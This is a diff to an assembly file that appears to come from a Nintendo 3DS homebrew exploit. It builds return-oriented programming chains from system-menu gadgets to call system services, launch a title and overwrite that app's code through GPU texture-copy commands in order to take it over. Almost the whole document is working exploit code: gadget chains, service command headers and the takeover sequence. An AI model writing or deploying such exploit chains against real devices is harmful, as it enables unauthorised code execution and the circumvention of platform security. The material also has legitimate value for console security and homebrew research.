@@ -78,6 +78,18 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	.word MENU_MEMCPY
 .endmacro
 
+.macro memcpy_r0_lr,src,size
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word src ; r1 (src)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word size ; r2 (size)
+		.word 0xDEADBABE ; r3 (garbage)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.word MENU_MEMCPY
+.endmacro
+
 .macro memcpy,dst,src,size,skip,offset
 	set_lr MENU_NOP
 	.if skip != 0
@@ -404,16 +416,20 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r8 (garbage)
 .endmacro
 
-.macro cond_jump_sp,cond_sp,cmpval_adr,cmpval_imm
-	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
-		.word cmpval_adr ; r0 (ptr)
-	.word ROP_MENU_LDR_R0R0_POP_R4PC ; pop {r0, pc}
-		.word 0xDEADBABE ; r4 (garbage)
+.macro cond_jump_sp_r0,cond_sp,cmpval_imm
 	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word cmpval_imm ; r1 (ptr)
 	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC
 		.word 0xDEADBABE ; r4 (garbage)
 	jump_sp_if_ne cond_sp
+.endmacro
+
+.macro cond_jump_sp,cond_sp,cmpval_adr,cmpval_imm
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word cmpval_adr ; r0 (ptr)
+	.word ROP_MENU_LDR_R0R0_POP_R4PC ; pop {r0, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	cond_jump_sp_r0 cond_sp, cmpval_imm
 .endmacro
 
 .macro gsp_acquire_right
@@ -429,6 +445,21 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r5 (garbage)
 		.word 0xDEADBABE ; r6 (garbage)
 	.word MENU_GSPGPU_ACQUIRERIGHT
+.endmacro
+
+.macro gsp_try_acquire_right
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6PC
+		.word 0x00150002 ; command header
+		.word 0x00000000
+		.word 0xFFFF8001 ; process handle
+	memcpy_r0_lr_prev (4 * 3), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
 .macro dsp_register_interrupt_events
@@ -604,6 +635,22 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro ptm_configure_n3ds_imm,val
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5PC
+		.word 0x08180040 ; command header
+		@@param:
+		.word val ; value
+	memcpy_r0_lr_prev (4 * 2), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	@@function_call:
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro invalidate_dcache,addr,size
 	get_cmdbuf 0
 	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
@@ -622,6 +669,38 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro apt_set_app_cpu_limit,value
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6PC
+		.word 0x004F0080 ; command header
+		.word 0x00000001
+		.word value
+	memcpy_r0_lr_prev (4 * 3), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_APT_HANDLE
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro nss_launch_title_raw,tidlow,tidhigh
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
+		.word 0xDEADBABE
+		.word 0x000200C0 ; command header
+		.word tidlow ; tid low
+		.word tidhigh ; tid high
+		.word 0x00000001 ; timeout low
+	memcpy_r0_lr_prev (4 * 4), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro nss_terminate_tid,tid_low,tid_high,timeout_low
 	get_cmdbuf 0
 	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
@@ -632,6 +711,25 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word timeout_low ; timeout low
 		.word 0x00000000 ; timeout high
 	memcpy_r0_lr_prev (4 * 5), 1, 0
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
+.macro nss_launch_title_update,tid_low,tid_high,mediatype
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5R6R7R8R9R10PC ; pop {r4, r5, r6, r7, r8, pc}
+		.word 0xDEADBABE ; garbage
+		.word 0x00150140 ; command header
+		.word tid_low ; tid low
+		.word tid_high ; tid high
+		.word mediatype ; mediatype
+		.word 0x00000000 ; 0
+		.word 0x00000004 ; flags
+	memcpy_r0_lr_prev (4 * 6), 1, 0
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
 	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
@@ -891,6 +989,13 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro load_r0,src
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word src ; r0
+	.word ROP_MENU_LDR_R0R0_POP_R4PC
+		.word 0xDEADBABE ; r4
+.endmacro
+
 .macro load_and_add_storeb,src,add,dst
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
@@ -965,10 +1070,10 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 .macro busyloop,total
 	.word ROP_MENU_POP_R1PC
 		.word 0x00000000
+	@@busyloop_start:
 	.word ROP_MENU_POP_R4R5PC
 		.word 0xDEADBABE
 		.word DUMMY_PTR - 0x10
-	@@busyloop_start:
 	.word ROP_MENU_ADD_R1R1x1_STR_R1R5x10_POP_R4R5R6PC
 		.word 0xDEADBABE
 		.word DUMMY_PTR - 0x10
@@ -1015,6 +1120,18 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		; unload dsp stuff
 			dsp_unload_component
 
+		; set n3ds cpu config so we can have same timing everywhere
+			ptm_configure_n3ds_imm 0x00
+
+		; same for syscore cpu percent
+			apt_open_session 0, 0
+			apt_set_app_cpu_limit 5
+			; get_cmdbuf 4
+			; .word ROP_MENU_LDR_R0R0_POP_R4PC
+			; 	.word 0xDEADBABE
+			; .word 0xDEADBABE
+			apt_close_session 0, 0
+
 		; this will be overwritten in the ropbin bkp so that it'll skip the APT title launch section
 			jump_sp MENU_LOADEDROP_BUFADR + APT_TitleLaunch
 
@@ -1034,7 +1151,9 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 			nss_terminate_tid DLPLAY_TIDLOW, 0x00040010, 100*1000*1000
 			
-			sleep 1000*1000*1000, 0x00000000
+			; sleep 1000*1000*1000, 0x00000000
+
+			busyloop 3*1000*1000
 
 			gsp_acquire_right
 
@@ -1072,15 +1191,24 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			flush_dcache MENU_OBJECT_LOC + appCode, 0x4000
 
 			writehwreg 0x202A04, 0x0100FF00
+			
+			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
+			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
+			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
+			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
 
 		; launch app that we want to takeover
 			nss_launch_title 0xBABE0004, 0xBABE0005
+			; nss_launch_title_raw 0xBABE0004, 0xBABE0005
+			; nss_launch_title_update 0xBABE0004, 0xBABE0005, 0xBABE000A
+
+			; busyloop 5*1000*1000
 
 		; takeover app
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppCode - object
 
-			; busyloop 3*1000*1000*1000
+			; busyloop 3*1000*1000
 
 		; sleep for a bit
 			sleep 200*1000*1000, 0x00000000
@@ -1089,6 +1217,16 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 		; release gsp rights
 			gsp_release_right
+
+		; sleep for a bit
+			sleep 200*1000*1000, 0x00000000
+
+		; ; try acquire gsp rights
+		; 	gsp_try_acquire_right
+		; 	get_cmdbuf 4
+		; 	.word ROP_MENU_LDR_R0R0_POP_R4PC
+		; 		.word 0xDEADBABE
+		; 	cond_jump_sp_r0 MENU_LOADEDROP_BUFADR + takeover_loop + WAITLOOP_OFFSET, 0x00000000
 
 		; memcpy wait loop to destination
 		; do it before sending handles because bootloader overwrites the ropbin, so let's avoid a race condition !
@@ -1119,7 +1257,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 	; copy hook code over app .text
 	.align 0x4
 	gxCommandAppHook:
-		.word 0x00000004 ; command header (SetTextureCopy)
+		.word 0x01000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appHook - object ; source address
 		.word 0xDEADBABE ; destination address (standin, will be filled in)
 		.word 0x00000200 ; size
@@ -1129,7 +1267,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0x00000000 ; unused
 
 	gxCommandAppCode:
-		.word 0x00000004 ; command header (SetTextureCopy)
+		.word 0x01000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appCode - object ; source address
 		.word 0xDEADBABE ; destination address (standin, will be filled in)
 		.word 0x00010000 ; size
@@ -1259,7 +1397,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 				nss_terminate_tid_deref MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidlow, MENU_LOADEDROP_BUFADR + WAITLOOP_OFFSET + waitLoop_tidhigh, 1000*1000*1000, WAITLOOP_OFFSET
 
-				sleep 1000*1000*1000, 0x00000000
+				sleep 2000*1000*1000, 0x00000000
 
 				apt_open_session 0, WAITLOOP_OFFSET
 				apt_finalize 0x300
@@ -1334,6 +1472,10 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 
 					; allocate buffer where we'll put all the stuff
 					control_memory MENU_LOADEDROP_BUFADR + linearMem, 0, 0, 0x47000, 0x10003, 0x3
+
+					set_lr MENU_NOP
+					load_r0 MENU_LOADEDROP_BUFADR + linearMem
+					memcpy_r0_lr MENU_LOADEDROP_BUFADR + displayCapture, 0x20
 
 					gsp_acquire_right
 
